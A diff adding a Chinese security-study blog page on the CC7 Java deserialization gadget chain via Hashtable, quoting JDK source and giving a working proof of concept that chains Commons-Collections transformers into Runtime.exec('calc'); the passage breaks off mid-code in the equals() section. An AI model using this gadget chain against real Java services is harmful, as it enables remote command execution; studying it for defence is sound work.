@@ -1,0 +1,610 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/index.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/index.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/index.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fupanc.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="CC7学习">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CC7">
+<meta property="og:url" content="https://fupanc.github.io/2024/08/13/CC7/index.html">
+<meta property="og:site_name" content="Fupanc">
+<meta property="og:description" content="CC7学习">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801094040061.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801094440480.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801095715776.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801143656945.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801164533548.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801101906268.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801165644341.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801170157261.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801204147243.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801204721007.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801173418173.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801184952561.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801194715026.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801195406545.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801222242418.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801215613372.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801200313953.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240802171424683.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801205912932.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801210157525.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801211235910.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801211625266.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240802172158779.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801214556431.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801223140188.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801225144106.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240802001231117.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240802001653262.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240802001948885.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240802002126349.png">
+<meta property="article:published_time" content="2024-08-13T12:15:47.476Z">
+<meta property="article:modified_time" content="2024-08-13T03:16:29.942Z">
+<meta property="article:author" content="Fupanc">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fupanc.github.io/2024/08/13/CC7/image-20240801094040061.png">
+
+
+<link rel="canonical" href="https://fupanc.github.io/2024/08/13/CC7/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://fupanc.github.io/2024/08/13/CC7/","path":"2024/08/13/CC7/","title":"CC7"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CC7 | Fupanc</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Fupanc" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Fupanc</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Fupanc's blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CC7"><span class="nav-number">1.</span> <span class="nav-text">CC7</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hashCode"><span class="nav-number">1.1.1.</span> <span class="nav-text">hashCode</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#equals"><span class="nav-number">1.1.2.</span> <span class="nav-text">equals</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Fupanc"
+      src="/images/123.jpg">
+  <p class="site-author-name" itemprop="name">Fupanc</p>
+  <div class="site-description" itemprop="description">志之难也，不在胜人，在于自胜</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Fupanc" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Fupanc" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:fupanc.vivo50@gmail.com" title="E-Mail → mailto:fupanc.vivo50@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://fupanc.github.io/2024/08/13/CC7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/123.jpg">
+      <meta itemprop="name" content="Fupanc">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Fupanc">
+      <meta itemprop="description" content="志之难也，不在胜人，在于自胜">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CC7 | Fupanc">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CC7
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-08-13 20:15:47 / 修改时间：11:16:29" itemprop="dateCreated datePublished" datetime="2024-08-13T20:15:47+08:00">2024-08-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Java安全</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">Java反序列化调用链分析</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Java%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/CC7/" itemprop="url" rel="index"><span itemprop="name">CC7</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>18k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>32 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>CC7学习</p>
+<span id="more"></span>
+
+<h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><p>CC7的思路同样是找另一条调用链来触发lazy.get()方法，<strong>这次用到的是Hashtable类</strong></p>
+<p><strong>测试环境：</strong></p>
+<ul>
+<li>JDK 8u411</li>
+<li>commons-collections 3.2.1</li>
+</ul>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>在ysoserial给出的调用链中，选取了<code>java.util.Hashtable#readObject</code>方法作为调用链的起点。</p>
+<p>Hashtable 与 HashMap很相似，都是一种key-value形式的哈希表，但是还是有区别：</p>
+<ul>
+<li>HashMap 与 Hashtable的父类不一样。</li>
+<li>两者内部基本都是使用“数组-链表”的结构，但是 HashMap 引入了红黑树的实现。</li>
+<li>Hashtable 的key-value 不允许为null值，但是HashMap 是允许的，后者会将 key&#x3D;value的实体放在index&#x3D;0 的位置。</li>
+<li>Hashtable 线程安全，HashMap 线程不安全。</li>
+</ul>
+<p>同样的，既然HashMap可以实现反序列化漏洞，Hashtable同样可以。</p>
+<p>分析源码，这个Hashtable类可以给出两条链，分别是</p>
+<ul>
+<li><code>readObject()</code>中的<code>reconstitution()</code>的<code>hashCode()</code>方法</li>
+<li><code>readObject()</code>中的<code>reconstitution()</code>的<code>equal()</code>方法</li>
+</ul>
+<h3 id="hashCode"><a href="#hashCode" class="headerlink" title="hashCode"></a>hashCode</h3><p>（其实给这个都可以算到CC6那里去，利用思路和CC6差不多）</p>
+<p>我们来看一下Hashtable的readObject()方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">         <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">        <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">        <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line">        lf = Math.min(Math.max(<span class="number">0.25f</span>, lf), <span class="number">4.0f</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">origlength</span> <span class="operator">=</span> s.readInt();</span><br><span class="line">        <span class="type">int</span> <span class="variable">elements</span> <span class="operator">=</span> s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (elements &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(<span class="string">&quot;Illegal # of Elements: &quot;</span> + elements);</span><br><span class="line"></span><br><span class="line">        origlength = Math.max(origlength, (<span class="type">int</span>)(elements / lf) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> (<span class="type">int</span>)((elements + elements / <span class="number">20</span>) / lf) + <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">            length--;</span><br><span class="line">        length = Math.min(length, origlength);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (length &lt; <span class="number">0</span>) &#123; <span class="comment">// overflow</span></span><br><span class="line">            length = origlength;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, length);</span><br><span class="line">        Hashtable.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line">        table = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;?,?&gt;[length];</span><br><span class="line">        threshold = (<span class="type">int</span>)Math.min(length * lf, MAX_ARRAY_SIZE + <span class="number">1</span>);</span><br><span class="line">        count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">            <span class="comment">// sync is eliminated for performance</span></span><br><span class="line">            reconstitutionPut(table, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>重点还是最后面那串代码，如下：<br><img src="/2024/08/13/CC7/image-20240801094040061.png" alt="image-20240801094040061"></p>
+<p>在readObject方法中，最后调用了<code>reconstitutionPut</code>方法将反序列化得到的key-value 放在内部实现的 Entry 数组 table里。</p>
+<p>跟进<code>reconstitutionPut</code>方法源码：</p>
+<p><img src="/2024/08/13/CC7/image-20240801094440480.png" alt="image-20240801094440480"></p>
+<p>可以看见这个<code>reconstitutionPut()</code>里面也调用了hashCode，并且可以很容易看出value不能为null。感觉和HashMap是差不多的，看一下Hashtable类的put()方法：<br><img src="/2024/08/13/CC7/image-20240801095715776.png" alt="image-20240801095715776"></p>
+<p>和CC6那就差不多了，这不就直接可以构造了吗</p>
+<p>直接按照CC6的HashMap的链子原理构造代码即可：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] chainpart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;Runtime.class,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">haha</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(haha,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazy,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashMap.put(outerMap,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        haha.remove(<span class="string">&quot;fupanc&quot;</span>);<span class="comment">//这里注意fupanc所属对象，使用lazy也行</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">x</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        x.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        x.set(chain,chainpart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(hashMap);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出计算机。</p>
+<p>————————</p>
+<h3 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h3><p>但是ysoserial链中的利用点却不是上面那个简单链，继续分析这个Hashtable类的代码。</p>
+<p><strong>先给出利用链要用到的类以及对应方法的源码</strong>：</p>
+<ul>
+<li>HashMap的父类AbstractMap类的equals()方法源码（get方法的起点）：</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="built_in">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">        <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">                Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">                <span class="type">K</span> <span 